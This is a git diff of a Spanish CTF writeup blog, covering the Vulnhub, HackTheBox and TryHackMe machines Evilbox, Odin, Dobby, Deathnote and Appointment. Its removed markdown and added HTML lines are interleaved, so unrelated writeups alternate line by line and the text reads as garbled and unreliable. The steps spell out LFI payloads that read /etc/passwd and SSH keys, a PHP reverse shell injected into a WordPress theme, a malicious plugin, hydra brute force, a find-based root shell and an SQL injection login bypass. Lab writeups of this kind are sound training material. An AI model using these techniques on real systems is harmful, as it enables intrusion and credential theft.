+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/25.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/3.png){: .align-center}
+<p>Y aplicar los cambios</p>
 
-Escanear todos los directorios ocultos
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/26.png" alt="image-center" class="align-center" /></p>
 
-```bash
-sudo gobuster dir –u 192.168.122.14 -w /usr/share/wordlists/dirb/big.txt
-```
+<p>Poner el equipo con el puerto de escucha</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/4.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/27.png" alt="image-center" class="align-center" /></p>
 
-Mostrará el archivo `robots.txt` y un directorio llamado `secret`
+<p>Entrar a una direccion inválida en la web de wordpress</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/5.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/28.png" alt="image-center" class="align-center" /></p>
 
-Ir a robots.txt, no mostrará nada relevante
-`192.168.122.14/robots.txt`
+<p>Abrirá una shell inversa</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/6.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/29.png" alt="image-center" class="align-center" /></p>
 
-Ir a secret, no mostrará contenido, sin embargo tampoco mostrará mensaje de error
-`192.168.122.14/secret`
+<p>Ir al home de los usuarios y mostrar contenido, no mostrará nada relevante</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/7.png){: .align-center}
+<p>Ir a /var/www/html/ y mostrar contenido</p>
 
-Realizar escaneo de directorios bajo el directorio secret y listando todo lo que termine en html, php o txt
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/30.png" alt="image-center" class="align-center" /></p>
 
-```bash
-sudo gobuster dir –u 192.168.122.14/secret  -w /usr/share/wordlists/dirb/big.txt -x html,php,txt
-```
+<p>Leer el contenido de <code class="language-plaintext highlighter-rouge">wp-config.php</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/8.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/31.png" alt="image-center" class="align-center" /></p>
 
-Aparecerá un nuevo archivo llamado `evil.php`
+<p>Mostrará una contraseña cifrada para el usuario root</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/9.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/32.png" alt="image-center" class="align-center" /></p>
 
-Al ir de nuevo no mostrará nada, ni si quiera mensaje de error
+<p>Copiar la contraseña cifrada y guardarla en un archivo del equipo atacante</p>
 
-`192.168.122.14/secret/evil.php`
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/33.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/10.png){: .align-center}
+<p>Usar <code class="language-plaintext highlighter-rouge">john</code> para descifrar la contraseña del usuario root</p>
 
-Tratar de fuzzear para intentar ejecutar comandos y de este modo leer el contenido de `/etc/passwd`
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/34.png" alt="image-center" class="align-center" /></p>
 
-```bash
-wfuzz -u "http://192.168.122.14/secret/evil.php?FUZZ=../../../../../../etc/passwd"  -w /usr/share/wordlists/fuzz-lfi-params-list.txt -hw 0
-```
+<p>Mostrará una contraseña para el usuario root</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/11.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/35.png" alt="image-center" class="align-center" /></p>
 
-Aparecerá como resultado que puede usarse command
+<p>Cambiar de usuario a root</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/12.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/36.png" alt="image-center" class="align-center" /></p>
 
-Ir a la url añadiendo `?command=../../../../../../etc/passwd`
+<p>Ir al directorio de root</p>
 
-`192.168.122.14/secret/evil.php?command=../../../../../../etc/passwd`
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/37.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/13.png){: .align-center}
+<p>Leer el contenido de <code class="language-plaintext highlighter-rouge">bjorn</code></p>
 
-Inspeccionar el código fuente para que se muestre de forma ordenada
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/38.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/14.png){: .align-center}
+<p>Al desencriptar el mensaje llevará a un vídeo de youtube</p>
 
-Al observar el archivo `/etc/passwd` podrá verse un usuario llamado mowree
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/39.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/15.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/40.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Odin 1.]]></summary></entry><entry><title type="html">Dobby hogwarts</title><link href="http://localhost:4000/vulnhub/dobby-hogwarts/" rel="alternate" type="text/html" title="Dobby hogwarts" /><published>2022-07-31T00:00:00+02:00</published><updated>2022-07-31T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/dobby-hogwarts</id><content type="html" xml:base="http://localhost:4000/vulnhub/dobby-hogwarts/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/hogwarts-dobby,597/">https://www.vulnhub.com/entry/hogwarts-dobby,597/</a></p>
 
-Ir a `/home/mowree/.ssh/id_rsa` para buscar la clave privada del usuario
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
+</code></pre></div></div>
 
-http://192.168.122.14/secret/evil.php?FUZZ=/home/mowree/.ssh/id_rsa
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/1.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/16.png){: .align-center}
+<p>Saldrá una IP con el puerto 80 abierto</p>
 
-Copiar la clave privada y guardarla en el equipo atacante
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/2.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/17.png){: .align-center}
+<p>Abrir navegador e ir a la IP, en este caso</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/18.png){: .align-center}
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.1.82
+</code></pre></div></div>
 
-Convertirlo a hash con la herramienta ssh2john.py y guardarlo en otro archivo nuevo
+<p>Se abrirá una web por defecto de apache</p>
 
-```bash
-/usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
-```
+<p>Hacemos click derecho e inspeccionar elemento</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/19.png){: .align-center}
+<p>Abajo del todo veremos una pista que nos dice que miremos en /alohomora así que ponemos</p>
 
-Crackear la contraseña con john
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/alohomora
+</code></pre></div></div>
 
-```bash
-john id_rsa_hash.txt
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/3.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/20.png){: .align-center}
+<p>Nos dirá que la clave de Draco es su casa (slytherin)</p>
 
-Mostrará la contraseña como resultado
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/4.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/21.png){: .align-center}
+<p>Ahora hacemos un gobuster para ver qué más directorios existen</p>
 
-Entrar por ssh con el usuario mowree y la contraseña encontrada
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster  <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.23 <span class="nt">-P</span> 80 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
 
-```bash
-ssh mowree@192.168.122.14 -i id_rsa
-```
+<p>Nos saldrán más directorios, entre ellos uno llamado log</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/22.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/5.png" alt="image-center" class="align-center" /></p>
 
-Mostrar el contenido del directorio home del usuario mowree y leer el archivo `user.txt`
+<p>Accedemos a el así</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/log
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/23.png){: .align-center}
+<p>Nos dará una contraseña y nos dirá que miremos en /DiagonAlley</p>
 
-Al mostrar los permisos de `/etc/passwd` podrá verse que tiene permiso de escritura para todos los usuarios
+<p>La contraseña está cifrada en base64, la desciframos y saldrá algo así</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/24.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/6.png" alt="image-center" class="align-center" /></p>
 
-Crear una nuevo usuario con una clave creada en  formato sha-512 desde la maquina atacante
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ilikesocks
+</code></pre></div></div>
 
-```bash
-mkpasswd -m sha-512
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/7.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/25.png){: .align-center}
+<p>Vamos a DiagonAlley así</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/DiagonAlley
+</code></pre></div></div>
 
-Guardarla en un archivo y crear una linea como si de un usuario se tratase, dando permisos de root
+<p>Veremos una web con dos artículos</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/26.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/8.png" alt="image-center" class="align-center" /></p>
 
-Copiar este nuevo usuario y ponerlo en el `/etc/passwd` de la máquina victima  
+<p>El primer artículo tendrá un código cifrado, lo podemos descifrar en decode.fr/cipher-identifier</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/27.png){: .align-center}
+<p>Ahora hacemos de nuevo un gobuster pero bajo ese directorio</p>
 
-Cambiar al usuario nuevo
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster  <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.23/DiagonAlley
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/28.png){: .align-center}
+<p>Nos mostrará que hay varios directorios y archivos de wordpress, entre ellos uno llamado wp-admin</p>
 
-Ir a `/root` y mostrar el contenido de root.txt
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/9.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/evilbox/29.png){: .align-center}
+<p>Accedemos a él así</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/DiagonAlley/wp-admin
+</code></pre></div></div>
 
-## Flags
+<p>Nos saldrá una página de inicio de sesión</p>
 
-User: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
+<p>Colocamos de nombre Draco y de contraseña slytherin</p>
 
-Root: 36QtXfdJWvdC0VavlPIApUbDlqTsBM]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Evilbox.]]></summary></entry><entry><title type="html">Deathnote</title><link href="http://localhost:4000/vulnhub/deathnote/" rel="alternate" type="text/html" title="Deathnote" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/deathnote</id><content type="html" xml:base="http://localhost:4000/vulnhub/deathnote/"><![CDATA[[https://www.vulnhub.com/entry/deathnote-1,739/](https://www.vulnhub.com/entry/deathnote-1,739/)
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/10.png" alt="image-center" class="align-center" /></p>
 
+<p>Copiar php-reverse-shell.php de /usr/share/webshells/php a Documentos</p>
 
-```bash
-sudo nmap -vvv -sS -sV -O 192.168.1.0/24
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/11.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/1.png){: .align-center}
+<p>Cambiar el propietario del archivo con chown para poder editarlo</p>
 
-Saldrá una IP con los puertos 80 y 22 abiertos
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/12.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/2.png){: .align-center}
+<p>Editarlo con nano para que lo IP sea la de nuestro equipo y el puerto que queramos poner como escucha</p>
 
-Al intentar entrar a la web saldrá un mensaje que dice Please wait y se redireccionará a una web de wordpress.
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/13.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/3.png){: .align-center}
+<p>Copiar todo el código e ir a la web de wordpress con el usuario de Draco</p>
 
-Realizar un escaneo de todos los directorios del sitio con gobuster
+<p>Ir a Apariencia -&gt; editor de temas</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/4.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/14.png" alt="image-center" class="align-center" /></p>
 
-Ir a `/robots.txt`
+<p>Seleccionar de la lista el de error 404</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/5.png){: .align-center}
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/6.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/15.png" alt="image-center" class="align-center" /></p>
 
-Ir a `/important.jpg`
+<p>Pegar el código y aplicar cambios</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/7.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/16.png" alt="image-center" class="align-center" /></p>
 
-Dirá que la imagen no se puede cargar por contener errores así que procedemos a descargar ese archivo a nuestro equipo usando `wget`
+<p>Usar el comando nc para escuchar desde ese puerto</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 4444
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/8.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/17.png" alt="image-center" class="align-center" /></p>
 
-Comprobar que el archivo es realmente una imagen en jpg
+<p>Ingresar un enlace inválido en wordpress</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/9.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/18.png" alt="image-center" class="align-center" /></p>
 
-Dirá que realmente es un documento de texto al que se le ha cambiado el nombre para hacer parecer que es una imagen.
+<p>Se abrirá el acceso a la Shell del equipo que tiene wordpress</p>
 
-Leer el archivo `important.jpg`, no es necesario cambiar su extensión para que cat lo reconozca.
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/19.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/10.png){: .align-center}
+<p>Ejecutar el comando</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-exec</span> /bin/bash <span class="nt">-p</span> <span class="se">\;</span> <span class="nt">-quit</span>
+</code></pre></div></div>
 
-Dirá que miremos en `/user.txt`, tambien que la contraseña puede estar en el lugar de la pista
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/20.png" alt="image-center" class="align-center" /></p>
 
-Entrar a la web y darle click al Hint
+<p>Nos dará acceso al bash en lugar de sh y con el usuario root</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/11.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/21.png" alt="image-center" class="align-center" /></p>
 
-Dirá que busquemos un archivo llamado `notes.txt` en el servidor o leamos el comentario de L
+<p>Cambiamos al usuario dobby con la contraseña que encontramos antes (ilikesocks)</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/12.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/22.png" alt="image-center" class="align-center" /></p>
 
-Mirar el comentario de L
+<p>Vamos al directorio /home/dobby y usamos el comando base32 al archivo flag1.txt para poder leer archivos dado que cat no funciona</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/13.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/23.png" alt="image-center" class="align-center" /></p>
 
-Probar a acceder desde el login con el usuario Kira y la contraseña iamjustic3
+<p>Usamos la web dcode.fr/identification-chiffrement para saber que cifrado está utilizando y nos saldrá que es base32</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/14.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/24.png" alt="image-center" class="align-center" /></p>
 
-Dará acceso al panel de administrador de Wordpress
+<p>Lo pasamos por un descifrador de base32</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/15.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/25.png" alt="image-center" class="align-center" /></p>
 
-Probar a entrar al editor de temas para modificar el de 404, mostrará que no es posible
+<p>Y saldrá otra flag nueva, repetimos el proceso de detectar que cifrado usa</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/16.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/26.png" alt="image-center" class="align-center" /></p>
 
-Utilizar `malicious-wordpress-plugin` para crear un plugin que abrirá un shell inverso
+<p>Y nos dirá ques cifrado md5, lo desciframos</p>
 
-```bash
-python wordpwn.py 192.168.122.5 4444 Y
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/27.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/17.png){: .align-center}
+<p>Nos saldrá un mensaje que dice goodjob</p>
 
-Quedará en el puerto de escucha y se generará un archivo zip que será el plugin
+<p>Esto, no sirve para nada realmente</p>
 
-Subir el plugin al sitio de wordpress
+<p>Ahora miramos el directorio del usuario root</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/18.png){: .align-center}
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/19.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/28.png" alt="image-center" class="align-center" /></p>
 
-Activar el plugin
+<p>Y leemos el archivo llamado proof.txt</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/20.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/29.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Dobby hogwarts.]]></summary></entry><entry><title type="html">Appointment</title><link href="http://localhost:4000/hackthebox/appointment/" rel="alternate" type="text/html" title="Appointment" /><published>2022-07-30T00:00:00+02:00</published><updated>2022-07-30T00:00:00+02:00</updated><id>http://localhost:4000/hackthebox/appointment</id><content type="html" xml:base="http://localhost:4000/hackthebox/appointment/"><![CDATA[<h1 id="preguntas">Preguntas</h1>
 
-Ir al editor de plugins y seleccionar GotEm
+<p><strong>What does the acronym SQL stand for?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/21.png){: .align-center}
+<p>Structured Query Language</p>
 
-Ir a la ruta del plugin
+<p><strong>What is one of the most common type of SQL vulnerabilities?</strong></p>
 
-http://192.168.122.7/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php
+<p>SQL injection</p>
 
-Se abrirá un shell inverso con meterpreter
+<p><strong>What does PII stand for?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/22.png){: .align-center}
+<p>Personally Identifiable Information</p>
 
-Entrar en modo shell con el comando `shell`
+<p><strong>What does the OWASP Top 10 list name the classification for this vulnerability?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/21.png){: .align-center}
+<p>A03:2021-Injection</p>
 
-Comprobar que el usuario es `www-data`
+<p><strong>What service and version are running on port 80 of the target?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/22.png){: .align-center}
+<p>Apache httpd 2.4.38 ((Debian))</p>
 
-Ir al directorio home y mostrar contenido para ver los usuarios, se mostraran el usuario kira y el usuario l
+<p><strong>What is the standard port used for the HTTPS protocol?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/23.png){: .align-center}
+<p>443</p>
 
-Entrar en el directorio de kira, mostrar el contenido e intentar leer el archivo `kira.txt`
+<p><strong>What is one luck-based method of exploiting login pages?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/24.png){: .align-center}
+<p>brute-forcing</p>
 
-Volver atrás e intentar lo mismo en el directorio de `l`, mostrar el contenido de `user.txt`, mostrará un texto cifrado en Brainfuck
+<p><strong>What is a folder called in web-application terminology?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/25.png){: .align-center}
+<p>directory</p>
 
-Descifrar el mensaje usando la web de dcode.fr, mostrará el mensaje "i think u got the shell, but you wont be able to kill me -kira"
+<p><strong>What response code is given for “Not Found” errors?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/26.png){: .align-center}
+<p>404</p>
 
-Volver al panel de wordpress e investigar más, en la sección de media se encontrará el archivo `notes.txt`
+<p><strong>What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/27.png){: .align-center}
+<p>dir</p>
 
-Parece ser un diccionario de posibles claves, descargarlo
+<p><strong>What symbol do we use to comment out parts of the code?</strong></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/28.png){: .align-center}
+<p>#</p>
 
-Usar `hydra` para encontrar cuál de las contraseñas es del usuario L en `ssh`
+<h1 id="proceso">Proceso</h1>
 
-```bash
-sudo hydra -t 4 -l l -P Downloads/notes.txt 192.168.122.7 ssh
-```
+<p>Entrar al sitio web desde el navegador poniendo la ip, aparecerá un login</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/29.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/htb/appointment/1.png" alt="image-center" class="align-center" /></p>
 
-Usuario: l
-Contraseña: death4me
+<p>Tratar de entrar mediante inyección de SQL del siguiente modo</p>
 
-Entrar por `ssh` con el usuario l y la contraseña death4me
+<p>Usuario= admin</p>
 
-Ir al directorio `/opt` y mostrar el contenido
+<p>Contraseña= wrongpassword’ OR ‘1’=’1</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/30.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/htb/appointment/2.png" alt="image-center" class="align-center" /></p>
 
-Ir al directorio y mostrar el contenido
+<p>Dará acceso mostrando un mensaje con el flag</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/31.png){: .align-center}
-
-Ir al directorio `fake-notebook-rule/` y mostrar el contenido, el archivo `hint` dirá que se use cyberchef aunque no es necesario
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/32.png){: .align-center}
-
-Comprobar el tipo de archivo de `case.wav`
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/33.png){: .align-center}
-
-Leer el archivo `case.wav`
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/34.png){: .align-center}
-
-Usar dcode.fr para descifrar el contenido
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/35.png){: .align-center}
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/36.png){: .align-center}
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/37.png){: .align-center}
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/38.png){: .align-center}
-
-Ir al directorio `kira-case/`, el archivo case-file.txt no mostrará nada relevante
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/39.png){: .align-center}
-
-Cambiar al usuario kira con la contraseña del mensaje cifrado anterior
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/40.png){: .align-center}
-
-Mostrar que permisos tiene el usuario con el comando
-
-```bash
-sudo -l
-```
-
-Mostrará que puede ejecutar todo, esto significa que puede cambiar a usuario root sin necesidad de introducir contraseña
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/41.png){: .align-center}
-
-Cambiar al usuario root
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/42.png){: .align-center}
-
-Ir al directorio de root y mostrar el contenido
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/43.png){: .align-center}
-
-Leer el contenido de `root.txt`
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/44.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Deathnote.]]></summary></entry><entry><title type="html">Basic Pentesting</title><link href="http://localhost:4000/tryhackme/basic-pentesting/" rel="alternate" type="text/html" title="Basic Pentesting" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/tryhackme/basic-pentesting</id><content type="html" xml:base="http://localhost:4000/tryhackme/basic-pentesting/"><![CDATA[# Preguntas
-
-**What does the acronym VM stand for?**
-
-virtual machine
-
-**What is the name of the hidden directory on the web server(enter name without /)?**
-
-Development
-
-**What is the username?**
-
-Jan
-
-**What is the password?**
-
-armando
-
-**What service do you use to access the server(answer in abbreviation in all caps)?**
-
-SSH
-
-**What is the name of the other user you found(all lower case)?**
-
-Kay
-
-**What is the final password you obtain?**
-
-heresareallystrongpasswordthatfollowsthepasswordpolicy$$
-
-
-# Proceso
-
-Listar todos los directorios ocultos de la web
-
-```bash
-sudo gobuster dir -u 10.10.35.80 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt
-```
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/1.png){: .align-center}
-
-Listar los usuarios del sistema
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/2.png){: .align-center}
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/3.png){: .align-center}
-
-Listar los recursos compartidos por SMB
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/4.png){: .align-center}
-
-Entrar al recurso compartido de Anonymous y mostrar el contenido
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/5.png){: .align-center}
-
-Usar `hydra` para encontrar la contraseña de jay
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/6.png){: .align-center}
-
